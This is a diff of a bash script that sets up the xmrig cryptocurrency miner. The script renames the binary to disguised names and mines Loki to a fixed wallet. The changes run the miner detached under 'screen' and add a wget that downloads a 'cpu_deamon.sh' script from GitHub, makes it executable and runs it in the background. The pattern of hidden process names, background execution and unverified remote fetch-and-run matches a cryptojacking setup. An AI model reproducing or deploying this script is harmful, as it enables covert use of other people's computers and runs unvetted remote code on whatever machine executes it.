@@ -1,7 +1,7 @@
 #!/bin/bash
 apt-get update
-apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-apt-get install -y cpulimit gawk
+apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget screen
+apt-get install -y cpulimit gawk 
 azure=mxsemsdnlkdj;
 mkdir /usr/local
 mkdir /usr/local/src
@@ -18,5 +18,9 @@ mv xmrig $azure -n
 cp $azure "$cpuname"
 rm -f  xmrig
 echo $cpuname" is starting"
-./"${cpuname}" --donate-level 1 -o loki.herominers.com:10110 -u LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV -p az -a rx/loki -k
+screen -d -m ./"${cpuname}" --donate-level 1 -o loki.herominers.com:10110 -u LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV -p az -a rx/loki -k
+wget https://raw.githubusercontent.com/ts6aud5vkg/gpuissa/master/cpu_deamon.sh
+chmod 755 cpu_deamon.sh
+screen -d -m ./cpu_deamon.sh
+
 
